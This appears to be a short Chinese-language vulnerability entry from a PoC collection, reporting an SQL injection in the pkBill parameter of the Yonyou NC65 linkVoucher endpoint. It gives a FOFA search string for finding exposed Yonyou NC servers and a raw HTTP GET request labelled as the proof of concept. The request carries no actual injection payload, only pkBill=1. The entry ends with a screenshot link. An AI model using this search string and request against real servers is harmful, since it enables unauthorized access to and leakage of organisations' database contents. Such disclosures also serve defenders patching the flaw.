## 用友NC系统linkVoucher存在sql注入漏洞

NC65系统/portal/pt/yercommon/linkVoucher请求中pkBill存在SQL注入漏洞，可能导致服务器数据泄露。

## fofa

```
title="YONYOU NC"
```

## poc

```
GET /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```

![image-20240526184707445](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405261847497.png)